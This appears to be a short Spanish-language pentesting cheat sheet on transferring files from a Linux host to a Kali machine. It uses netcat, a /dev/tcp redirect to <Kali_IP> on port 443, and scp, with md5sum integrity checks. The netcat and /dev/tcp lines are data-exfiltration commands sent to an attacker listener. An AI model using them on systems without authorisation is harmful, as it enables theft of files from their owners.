Linux -> Linux

Transferencia de archivo netcat

# Linux
nc <Kali_IP> 443 < file
# Kali
nc -nlvp 443 > file
# Comprobar Integridad con md5sum
md5sum file # Ver mismo hash para ambos file

Transferencia de archivo netcat y cat

# Linux
cat < file > /dev/tcp/<Kali_IP>/443
# Kali
nc -nlvp 443 > file
# Comprobar Integridad con md5sum
md5sum file # Ver mismo hash para ambos file

SCP

# Kali
scp <user>@<linux_ip>:/path/file .
# Password de <user>: <pass>
